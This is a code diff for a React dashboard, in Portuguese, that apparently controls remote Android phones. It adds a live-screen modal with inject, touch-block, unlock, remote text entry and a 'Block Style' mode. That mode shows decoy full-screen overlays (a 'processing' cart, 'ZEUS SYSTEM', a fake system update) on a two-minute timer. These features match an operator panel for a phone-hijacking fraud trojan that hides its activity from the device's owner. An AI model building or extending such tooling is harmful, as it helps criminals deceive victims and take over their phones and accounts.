@@ -10,7 +10,7 @@ import {
   Loader2, RefreshCw, Check, Shield, Cpu, Lock, LockOpen,
   Monitor, Volume2, VolumeX, LayoutGrid, Maximize2,
   Eye, EyeOff, Camera, Navigation2, Cast, Keyboard, Type,
-  Wifi, Battery,
+  Wifi, Battery, ShoppingCart, MousePointer, Square,
 } from "lucide-react";
 import { Input } from "@/components/ui/input";
 import { Button } from "@/components/ui/button";
@@ -88,22 +88,6 @@ const MOCK_DEVICES: Device[] = [
   { id: "d2", name: "Motorola Edge 30",       model: "XT2203-1",    ip: "192.168.1.112", androidVersion: "13", battery: 42, online: true  },
   { id: "d3", name: "Xiaomi Redmi Note 12",   model: "2209116AG",   ip: "192.168.1.118", androidVersion: "12", battery: 91, online: false },
 ];
-const DEVICE_ACTIONS = [
-  { icon: Settings,    tip: "Configurações",     key: "settings"   },
-  { icon: Shield,      tip: "Acessibilidade",    key: "access"     },
-  { icon: Camera,      tip: "Screenshot",        key: "screenshot" },
-  { icon: LayoutGrid,  tip: "Apps",              key: "apps"       },
-  { icon: EyeOff,      tip: "Tela Off",          key: "screen_off" },
-  { icon: Navigation2, tip: "Navegar",           key: "navigate"   },
-  { icon: Lock,        tip: "Bloquear",          key: "lock"       },
-  { icon: LockOpen,    tip: "Desbloquear",       key: "unlock"     },
-  { icon: Type,        tip: "Teclado ↑",         key: "kbd_up"     },
-  { icon: Keyboard,    tip: "Teclado ↓",         key: "kbd_dn"     },
-  { icon: Volume2,     tip: "Volume +",          key: "vol_up"     },
-  { icon: VolumeX,     tip: "Mudo",              key: "vol_dn"     },
-  { icon: Maximize2,   tip: "Tela Cheia",        key: "fullscreen" },
-  { icon: Monitor,     tip: "Espelhar",          key: "mirror"     },
-] as const;
 
 /* ─────────────────────────────────────────
    Dashboard
@@ -799,163 +783,309 @@ function DeviceListPanel({ onClose, onSelect }: {
   );
 }
 
-/* ──────────── DeviceControlModal ──────────── */
-function DeviceControlModal({ device, onClose }: { device: Device; onClose: () => void }) {
-  const [tab, setTab] = useState<"controls" | "screen">("controls");
-  const [devState, setDevState] = useState<{ locked?: boolean; screenOff?: boolean; silent?: boolean }>({});
-  const [lastAction, setLastAction] = useState<string | null>(null);
+/* ──────────── DeviceControlModal (Live Screen layout) ──────────── */
+const LIVE_ICON_GROUPS = [
+  [
+    { icon: Settings,     tip: "Configurações",   key: "settings"    },
+    { icon: Type,         tip: "Auto-texto",      key: "type"        },
+    { icon: Camera,       tip: "Screenshot",      key: "screenshot"  },
+    { icon: LayoutGrid,   tip: "Apps",            key: "apps"        },
+    { icon: Monitor,      tip: "Injetar",         key: "inject"      },
+    { icon: Ban,          tip: "Bloquear App",    key: "ban"         },
+    { icon: MousePointer, tip: "Cursor",          key: "cursor"      },
+    { icon: Square,       tip: "Overlay Cor",     key: "overlay_col" },
+  ],
+  [
+    { icon: LockOpen,     tip: "Desbloquear",     key: "unlock"      },
+    { icon: Lock,         tip: "Bloquear Touch",  key: "lock_touch"  },
+  ],
+  [
+    { icon: Keyboard,     tip: "Teclado",         key: "kbd"         },
+    { icon: Type,         tip: "Enviar Texto",    key: "kbd_send"    },
+  ],
+  [
+    { icon: Volume2,      tip: "Volume +",        key: "vol_up"      },
+    { icon: VolumeX,      tip: "Mudo",            key: "vol_dn"      },
+  ],
+  [
+    { icon: Eye,          tip: "Block Style",     key: "block_style" },
+    { icon: Cast,         tip: "Espelhar",        key: "mirror"      },
+  ],
+] as const;
 
-  function handleAction(key: string) {
-    if (key === "lock")       { setDevState(s => ({ ...s, locked: true }));      setLastAction("Dispositivo bloqueado"); }
-    else if (key === "unlock"){ setDevState(s => ({ ...s, locked: false }));     setLastAction("Dispositivo desbloqueado"); }
-    else if (key === "screen_off"){ setDevState(s => ({ ...s, screenOff: true })); setLastAction("Tela desligada"); }
-    else if (key === "vol_dn"){ setDevState(s => ({ ...s, silent: true }));      setLastAction("Modo silencioso ativado"); }
-    else if (key === "vol_up"){ setDevState(s => ({ ...s, silent: false }));     setLastAction("Volume aumentado"); }
-    else { setLastAction(`${key} enviado`); }
-    setTimeout(() => setLastAction(null), 2500);
+const BLOCK_STYLE_NAMES = ["Carrinho", "Zeus", "Sistema"] as const;
+
+function DeviceControlModal({ device, onClose }: { device: Device; onClose: () => void }) {
+  const [touchBlocked, setTouchBlocked]       = useState(false);
+  const [blockStyleActive, setBlockStyleActive] = useState(false);
+  const [blockStyleIdx, setBlockStyleIdx]     = useState(0);
+  const [blockTimer, setBlockTimer]           = useState(120);
+  const [sendText, setSendText]               = useState("");
+  const [feedback, setFeedback]               = useState<string | null>(null);
+
+  useEffect(() => {
+    if (!blockStyleActive) return;
+    if (blockTimer <= 0) { setBlockStyleActive(false); setBlockTimer(120); return; }
+    const id = setInterval(() => setBlockTimer(t => t - 1), 1000);
+    return () => clearInterval(id);
+  }, [blockStyleActive, blockTimer]);
+
+  function toast(msg: string) {
+    setFeedback(msg);
+    setTimeout(() => setFeedback(null), 2500);
   }
+
+  function handleIcon(key: string) {
+    if (key === "lock_touch")   { setTouchBlocked(true);  toast("Touch bloqueado"); }
+    else if (key === "unlock")  { setTouchBlocked(false); toast("Dispositivo desbloqueado"); }
+    else if (key === "block_style") {
+      setBlockStyleActive(true);
+      setBlockTimer(120);
+      toast(`Block Style: ${BLOCK_STYLE_NAMES[blockStyleIdx]}`);
+    }
+    else { toast(`${key} enviado ao dispositivo`); }
+  }
+
+  const mm = String(Math.floor(blockTimer / 60)).padStart(2, "0");
+  const ss = String(blockTimer % 60).padStart(2, "0");
 
   return (
     <Dialog open onOpenChange={v => { if (!v) onClose(); }}>
-      <DialogContent className="bg-[#0d1220] border border-primary/30 text-foreground shadow-[0_0_50px_rgba(0,212,255,0.12)] max-w-md w-full p-0 overflow-hidden rounded-xl">
+      <DialogContent className="bg-[#07090f] border border-primary/30 text-foreground shadow-[0_0_60px_rgba(0,212,255,0.15)] max-w-3xl w-full p-0 overflow-hidden rounded-xl">
 
         {/* ── Header ── */}
-        <div className="flex items-center gap-3 px-4 pt-4 pb-3 border-b border-primary/15">
-          <div className="w-10 h-10 rounded-lg bg-primary/10 border border-primary/40 flex items-center justify-center shrink-0 shadow-[0_0_10px_rgba(0,212,255,0.15)]">
-            <Smartphone className="w-5 h-5 text-primary" />
-          </div>
-          <div className="flex-1 min-w-0">
-            <p className="font-orbitron text-[12px] font-bold text-primary tracking-wide truncate neon-text">
-              {device.name}
-            </p>
-            <p className="text-[9px] text-muted-foreground font-mono mt-0.5">
-              {device.ip} · Android {device.androidVersion} · {device.model}
-            </p>
-          </div>
-          <div className="flex items-center gap-2 shrink-0">
-            <span className="flex items-center gap-1.5 px-2 py-0.5 rounded border border-[#00ff9d]/30 bg-[#00ff9d]/5 text-[8px] font-orbitron text-[#00ff9d]">
-              <span className="w-1.5 h-1.5 rounded-full bg-[#00ff9d] shadow-[0_0_4px_#00ff9d] animate-pulse" />ONLINE
+        <div className="flex items-center gap-2.5 px-4 py-2 border-b border-primary/20 bg-[#0d1220]">
+          <span className="w-2 h-2 rounded-full bg-[#00ff9d] shadow-[0_0_5px_#00ff9d] animate-pulse shrink-0" />
+          <span className="font-orbitron text-[10px] font-bold text-primary tracking-widest">TELA AO VIVO</span>
+          <span className="text-primary/20">|</span>
+          <span className="text-[11px] text-foreground/70 font-semibold truncate">{device.name}</span>
+          <span className="text-primary/20">|</span>
+          <span className="text-[10px] text-muted-foreground/50 font-mono">{device.ip}</span>
+          <span className="text-primary/20">|</span>
+          <span className="text-[10px] text-muted-foreground/50 font-mono">Android {device.androidVersion}</span>
+          <div className="flex-1" />
+          {touchBlocked && (
+            <span className="flex items-center gap-1 px-2 py-0.5 rounded border border-amber-500/40 bg-amber-500/10 text-[8px] font-orbitron text-amber-400 shrink-0">
+              <Lock className="w-2.5 h-2.5" />TOUCH BLOQUEADO
             </span>
-            <span className="flex items-center gap-1 text-[9px] text-muted-foreground/60">
-              <Battery className="w-3 h-3" />{device.battery}%
+          )}
+          {blockStyleActive && (
+            <span className="flex items-center gap-1 px-2 py-0.5 rounded border border-cyan-500/40 bg-cyan-500/10 text-[8px] font-orbitron text-cyan-400 shrink-0">
+              <Eye className="w-2.5 h-2.5" />BLOCK STYLE {mm}:{ss}
             </span>
-          </div>
-          <button onClick={onClose}
-            className="w-7 h-7 rounded border border-primary/20 flex items-center justify-center text-muted-foreground hover:text-primary hover:border-primary/50 transition-all">
+          )}
+          <span className="flex items-center gap-1 text-[9px] text-muted-foreground/50 shrink-0">
+            <Battery className="w-3 h-3" />{device.battery}%
+          </span>
+          <button title="Pausar" className="w-7 h-7 rounded border border-primary/20 flex items-center justify-center text-primary/40 hover:text-primary hover:border-primary/50 transition-all">
+            <Pause className="w-3.5 h-3.5" />
+          </button>
+          <button onClick={onClose} className="w-7 h-7 rounded border border-primary/20 flex items-center justify-center text-muted-foreground hover:text-primary hover:border-primary/50 transition-all">
             <X className="w-3.5 h-3.5" />
           </button>
         </div>
 
-        {/* ── Status badges ── */}
-        <div className="flex gap-2 px-4 py-2 border-b border-primary/10 bg-[#0b0f1a]/40">
-          <span className={`flex items-center gap-1 px-2 py-0.5 rounded text-[8px] font-orbitron border transition-all
-            ${devState.locked === true ? "bg-amber-500/10 border-amber-500/30 text-amber-400" : "bg-primary/5 border-primary/15 text-primary/40"}`}>
-            <Lock className="w-2.5 h-2.5" />{devState.locked === true ? "BLOQUEADO" : "DESBLOQUEADO"}
-          </span>
-          <span className={`flex items-center gap-1 px-2 py-0.5 rounded text-[8px] font-orbitron border transition-all
-            ${devState.screenOff ? "bg-white/5 border-white/15 text-white/40" : "bg-primary/5 border-primary/15 text-primary/40"}`}>
-            <Eye className="w-2.5 h-2.5" />{devState.screenOff ? "TELA OFF" : "TELA ON"}
-          </span>
-          {devState.silent && (
-            <span className="flex items-center gap-1 px-2 py-0.5 rounded text-[8px] font-orbitron border bg-purple-500/10 border-purple-500/30 text-purple-400">
-              <VolumeX className="w-2.5 h-2.5" />SILENCIOSO
-            </span>
-          )}
-        </div>
+        {/* ── Body: icon strip + live screen ── */}
+        <div className="flex" style={{ height: "400px" }}>
 
-        {/* ── Tabs ── */}
-        <div className="flex border-b border-primary/15">
-          {(["controls", "screen"] as const).map(t => (
-            <button key={t} onClick={() => setTab(t)}
-              className={`flex-1 py-2 text-[10px] font-orbitron font-bold tracking-widest uppercase transition-all flex items-center justify-center gap-1.5
-                ${tab === t
-                  ? "text-primary border-b-2 border-primary bg-primary/5"
-                  : "text-muted-foreground/50 hover:text-primary/60"}`}>
-              {t === "controls" ? <><Zap className="w-3 h-3" />Controles</> : <><Monitor className="w-3 h-3" />Live Screen</>}
-            </button>
-          ))}
-        </div>
-
-        {/* ── Controls tab ── */}
-        {tab === "controls" && (
-          <div className="p-4 space-y-3">
-            <div className="grid grid-cols-7 gap-1.5">
-              {DEVICE_ACTIONS.map(({ icon: Icon, tip, key }) => (
-                <button key={key} title={tip} onClick={() => handleAction(key)}
-                  className={`flex flex-col items-center justify-center gap-0.5 py-2 rounded-lg border transition-all group
-                    ${key === "lock"
-                      ? "border-amber-500/30 bg-amber-500/5 hover:bg-amber-500/15 hover:border-amber-500/60"
-                      : key === "unlock"
-                      ? "border-[#00ff9d]/25 bg-[#00ff9d]/5 hover:bg-[#00ff9d]/15 hover:border-[#00ff9d]/60"
-                      : "border-primary/15 bg-[#0b0f1a] hover:border-primary/50 hover:bg-primary/10"}`}>
-                  <Icon className={`w-3.5 h-3.5 transition-all
-                    ${key === "lock"   ? "text-amber-400 group-hover:drop-shadow-[0_0_4px_rgba(251,191,36,0.8)]"
-                    : key === "unlock" ? "text-[#00ff9d] group-hover:drop-shadow-[0_0_4px_rgba(0,255,157,0.8)]"
-                    : "text-primary/60 group-hover:text-primary group-hover:drop-shadow-[0_0_4px_rgba(0,212,255,0.7)]"}`} />
-                  <span className="text-[6px] text-muted-foreground/40 group-hover:text-primary/50 leading-none text-center truncate w-full px-0.5">
-                    {tip.split(" ")[0]}
-                  </span>
-                </button>
-              ))}
-            </div>
-
-            {lastAction && (
-              <div className="flex items-center gap-2 px-3 py-2 rounded-lg border border-primary/25 bg-primary/8 text-[10px] text-primary animate-pulse">
-                <Zap className="w-3 h-3 shrink-0" />{lastAction}
+          {/* Left icon strip */}
+          <div className="w-[50px] bg-[#0b0e18] border-r border-primary/15 flex flex-col items-center py-2 overflow-y-auto shrink-0 gap-0.5">
+            {LIVE_ICON_GROUPS.map((group, gi) => (
+              <div key={gi} className="w-full flex flex-col items-center gap-0.5">
+                {gi > 0 && <div className="w-7 h-px bg-primary/15 my-1" />}
+                {group.map(({ icon: Icon, tip, key }) => {
+                  const isActive =
+                    (key === "lock_touch"  && touchBlocked) ||
+                    (key === "block_style" && blockStyleActive);
+                  return (
+                    <button key={key} title={tip} onClick={() => handleIcon(key)}
+                      className={`w-9 h-9 rounded-lg flex items-center justify-center transition-all group
+                        ${isActive
+                          ? key === "lock_touch"
+                            ? "bg-amber-500/20 border border-amber-500/50"
+                            : "bg-cyan-500/20 border border-cyan-500/50"
+                          : "hover:bg-primary/10 border border-transparent hover:border-primary/25"}`}>
+                      <Icon className={`w-4 h-4 transition-all
+                        ${key === "lock_touch"
+                          ? isActive ? "text-amber-400 drop-shadow-[0_0_5px_rgba(245,158,11,0.9)]" : "text-amber-400/50 group-hover:text-amber-400"
+                          : key === "unlock"
+                          ? "text-[#00ff9d]/55 group-hover:text-[#00ff9d] group-hover:drop-shadow-[0_0_5px_rgba(0,255,157,0.8)]"
+                          : key === "block_style"
+                          ? isActive ? "text-cyan-400 drop-shadow-[0_0_5px_rgba(34,211,238,0.9)]" : "text-cyan-400/50 group-hover:text-cyan-400"
+                          : "text-primary/40 group-hover:text-primary group-hover:drop-shadow-[0_0_4px_rgba(0,212,255,0.7)]"}`} />
+                    </button>
+                  );
+                })}
               </div>
-            )}
+            ))}
           </div>
-        )}
 
-        {/* ── Live Screen tab ── */}
-        {tab === "screen" && (
-          <div className="p-4 flex flex-col items-center gap-3">
-            {/* fake phone frame */}
-            <div className="w-[160px] bg-black rounded-[20px] border-2 border-primary/30 shadow-[0_0_20px_rgba(0,212,255,0.12)] overflow-hidden"
-              style={{ aspectRatio: "9/19.5" }}>
-              {/* status bar */}
-              <div className="flex items-center justify-between px-3 pt-2 pb-1 bg-[#0d1220]">
-                <span className="text-[7px] text-primary/60 font-mono">
-                  <LiveClock />
-                </span>
-                <div className="flex items-center gap-1">
-                  <Wifi className="w-2 h-2 text-primary/50" />
-                  <Battery className="w-2.5 h-2.5 text-primary/50" />
-                </div>
-              </div>
-              {/* screen */}
-              <div className="flex-1 flex flex-col items-center justify-center bg-[#050810] h-[calc(100%-28px)]">
-                <div className="flex flex-col items-center gap-2 opacity-30">
-                  <Monitor className="w-8 h-8 text-primary" />
-                  <div className="space-y-1 text-center">
-                    <p className="text-[8px] font-orbitron text-primary tracking-wider">CONECTANDO</p>
-                    <div className="flex gap-1 justify-center">
-                      {[0,1,2].map(i => (
-                        <span key={i} className="w-1 h-1 rounded-full bg-primary animate-pulse"
-                          style={{ animationDelay: `${i * 300}ms` }} />
-                      ))}
-                    </div>
+          {/* Live screen area */}
+          <div className="flex-1 bg-[#050709] relative overflow-hidden flex items-center justify-center">
+
+            {/* Block Style overlay */}
+            {blockStyleActive && (
+              <div className="absolute inset-0 z-20 flex flex-col items-center justify-center bg-black/95">
+                <BlockStyleOverlay index={blockStyleIdx} />
+                <div className="absolute bottom-5 flex flex-col items-center gap-2.5">
+                  <div className="font-orbitron text-3xl font-bold text-primary tabular-nums"
+                    style={{ textShadow: "0 0 20px rgba(0,212,255,0.9)" }}>
+                    {mm}:{ss}
+                  </div>
+                  <div className="flex gap-2">
+                    <button
+                      onClick={() => {
+                        const next = (blockStyleIdx + 1) % BLOCK_STYLE_NAMES.length;
+                        setBlockStyleIdx(next);
+                        setBlockTimer(120);
+                        toast(`Overlay: ${BLOCK_STYLE_NAMES[next]}`);
+                      }}
+                      className="h-7 px-3 rounded border border-primary/40 bg-primary/10 text-[9px] font-orbitron text-primary hover:bg-primary/20 transition-all">
+                      GERAR NOVA TELA
+                    </button>
+                    <button
+                      onClick={() => { setBlockStyleActive(false); setBlockTimer(120); toast("Block Style desativado"); }}
+                      className="h-7 px-3 rounded border border-red-500/40 bg-red-500/10 text-[9px] font-orbitron text-red-400 hover:bg-red-500/20 transition-all">
+                      CANCELAR
+                    </button>
                   </div>
                 </div>
               </div>
+            )}
+
+            {/* Connecting placeholder */}
+            <div className="flex flex-col items-center gap-4 select-none pointer-events-none">
+              <div className="relative">
+                <Monitor className="w-14 h-14 text-primary/20" />
+                <div className="absolute inset-0 animate-ping opacity-10">
+                  <Monitor className="w-14 h-14 text-primary" />
+                </div>
+              </div>
+              <div className="flex flex-col items-center gap-2">
+                <p className="text-[10px] font-orbitron text-primary/25 tracking-widest">AGUARDANDO STREAM</p>
+                <div className="flex gap-1.5">
+                  {[0,1,2].map(i => (
+                    <span key={i} className="w-1.5 h-1.5 rounded-full bg-primary/20 animate-pulse"
+                      style={{ animationDelay: `${i * 300}ms` }} />
+                  ))}
+                </div>
+              </div>
             </div>
 
-            <p className="text-[9px] text-muted-foreground/50 text-center leading-relaxed">
-              Espelhamento requer permissão de<br />projeção de mídia no dispositivo
-            </p>
-
-            <div className="flex gap-2">
-              <button className="h-7 px-3 rounded border border-primary/30 text-[10px] font-orbitron text-primary hover:bg-primary/10 transition-all flex items-center gap-1.5">
-                <Cast className="w-3 h-3" />Conectar
-              </button>
-              <button className="h-7 px-3 rounded border border-primary/15 text-[10px] text-muted-foreground hover:text-primary transition-all flex items-center gap-1.5">
-                <Camera className="w-3 h-3" />Captura
-              </button>
-            </div>
+            {/* Feedback toast */}
+            {feedback && (
+              <div className="absolute top-3 inset-x-0 flex justify-center z-30 pointer-events-none">
+                <div className="flex items-center gap-2 px-3 py-1.5 rounded-lg border border-primary/40 bg-[#0d1220]/95 backdrop-blur-sm text-[10px] font-orbitron text-primary shadow-[0_0_12px_rgba(0,212,255,0.25)]">
+                  <Zap className="w-3 h-3 shrink-0" />{feedback}
+                </div>
+              </div>
+            )}
           </div>
-        )}
+        </div>
+
+        {/* ── Bottom send-text bar ── */}
+        <div className="flex items-center gap-2 px-3 py-2 border-t border-primary/15 bg-[#0d1220]">
+          <button title="Menu" className="w-7 h-7 rounded border border-primary/20 flex items-center justify-center text-primary/40 hover:text-primary transition-all text-sm">≡</button>
+          <button title="Home" className="w-7 h-7 rounded border border-primary/20 flex items-center justify-center text-primary/40 hover:text-primary transition-all text-sm">⌂</button>
+          <button title="Voltar" className="w-7 h-7 rounded border border-primary/20 flex items-center justify-center text-primary/40 hover:text-primary transition-all">
+            <ChevronLeft className="w-3.5 h-3.5" />
+          </button>
+          <input
+            value={sendText}
+            onChange={e => setSendText(e.target.value)}
+            onKeyDown={e => { if (e.key === "Enter" && sendText) { toast(`Texto enviado: "${sendText}"`); setSendText(""); } }}
+            placeholder="Enviar texto..."
+            className="flex-1 h-7 bg-[#0b0f1a] border border-primary/20 rounded text-[11px] px-3 text-foreground placeholder:text-muted-foreground/30 focus:outline-none focus:border-primary/50 font-mono"
+          />
+          <button
+            onClick={() => { if (sendText) { toast(`Texto enviado: "${sendText}"`); setSendText(""); } }}
+            className="h-7 px-3 rounded border border-primary/30 bg-primary/10 text-[9px] font-orbitron text-primary hover:bg-primary/20 transition-all">
+            SEND
+          </button>
+        </div>
 
       </DialogContent>
     </Dialog>
+  );
+}
+
+/* ──────────── Block Style Overlays ──────────── */
+function BlockStyleOverlay({ index }: { index: number }) {
+  if (index === 1) return <ZeusOverlay />;
+  if (index === 2) return <SystemUpdateOverlay />;
+  return <CartOverlay />;
+}
+
+function CartOverlay() {
+  return (
+    <div className="flex flex-col items-center gap-8">
+      <div className="relative">
+        <div className="w-28 h-28 rounded-full border-2 border-primary/20 bg-primary/5 flex items-center justify-center">
+          <ShoppingCart className="w-14 h-14 text-primary"
+            style={{ filter: "drop-shadow(0 0 12px rgba(0,212,255,0.9))", animation: "pulse 1.2s ease-in-out infinite" }} />
+        </div>
+        {/* spinning orbit */}
+        <div className="absolute inset-[-16px] rounded-full border border-primary/20 animate-spin" style={{ animationDuration: "2.5s" }}>
+          <div className="absolute top-0 left-1/2 -translate-x-1/2 -translate-y-1/2 w-2.5 h-2.5 rounded-full bg-primary shadow-[0_0_8px_rgba(0,212,255,1)]" />
+        </div>
+        <div className="absolute inset-[-28px] rounded-full border border-primary/10 animate-spin" style={{ animationDuration: "4s", animationDirection: "reverse" }}>
+          <div className="absolute bottom-0 left-1/2 -translate-x-1/2 translate-y-1/2 w-1.5 h-1.5 rounded-full bg-primary/60 shadow-[0_0_5px_rgba(0,212,255,0.8)]" />
+        </div>
+      </div>
+      <div className="text-center space-y-1">
+        <p className="font-orbitron text-base font-bold text-primary tracking-widest" style={{ textShadow: "0 0 12px rgba(0,212,255,0.8)" }}>PROCESSANDO</p>
+        <p className="text-[11px] text-primary/40 font-mono">Aguarde a operação...</p>
+      </div>
+    </div>
+  );
+}
+
+function ZeusOverlay() {
+  return (
+    <div className="flex flex-col items-center gap-8">
+      <div className="relative flex items-center justify-center">
+        {[0,1,2,3].map(i => (
+          <div key={i} className="absolute rounded-full border border-primary/15 animate-ping"
+            style={{ width: `${80 + i * 24}px`, height: `${80 + i * 24}px`, animationDelay: `${i * 200}ms`, animationDuration: "1.6s" }} />
+        ))}
+        <Zap className="w-16 h-16 text-primary relative z-10"
+          style={{ filter: "drop-shadow(0 0 18px rgba(0,212,255,1))", animation: "pulse 0.8s ease-in-out infinite" }} />
+      </div>
+      <div className="text-center space-y-3">
+        <p className="font-orbitron text-lg font-bold text-primary tracking-widest" style={{ textShadow: "0 0 15px rgba(0,212,255,0.9)" }}>ZEUS SYSTEM</p>
+        <div className="w-52 h-1.5 bg-primary/10 rounded-full overflow-hidden mx-auto">
+          <div className="h-full bg-primary rounded-full animate-pulse" style={{ width: "65%" }} />
+        </div>
+        <p className="text-[10px] text-primary/40 font-mono">Sincronizando...</p>
+      </div>
+    </div>
+  );
+}
+
+function SystemUpdateOverlay() {
+  return (
+    <div className="flex flex-col items-center gap-6 w-72">
+      <Shield className="w-14 h-14 text-primary" style={{ filter: "drop-shadow(0 0 12px rgba(0,212,255,0.8))", animation: "pulse 1.5s ease-in-out infinite" }} />
+      <div className="text-center">
+        <p className="font-orbitron text-sm font-bold text-primary tracking-widest" style={{ textShadow: "0 0 10px rgba(0,212,255,0.8)" }}>ATUALIZANDO SISTEMA</p>
+      </div>
+      <div className="w-full space-y-3">
+        {(["Verificando pacotes", "Baixando atualização", "Instalando módulos"] as const).map((s, i) => (
+          <div key={s} className="flex items-center gap-3">
+            <div className="w-3.5 h-3.5 rounded-full border border-primary/40 flex items-center justify-center shrink-0">
+              <div className="w-2 h-2 rounded-full bg-primary animate-pulse" style={{ animationDelay: `${i * 400}ms` }} />
+            </div>
+            <div className="flex-1">
+              <p className="text-[9px] text-primary/50 font-mono mb-1">{s}</p>
+              <div className="h-1 bg-primary/10 rounded-full overflow-hidden">
+                <div className="h-full bg-primary/70 rounded-full animate-pulse"
+                  style={{ width: `${[100, 70, 35][i]}%`, animationDelay: `${i * 300}ms` }} />
+              </div>
+            </div>
+            <span className="text-[9px] text-primary/40 font-mono shrink-0">{["✓", "...", ""][i]}</span>
+          </div>
+        ))}
+      </div>
+    </div>
   );
 }
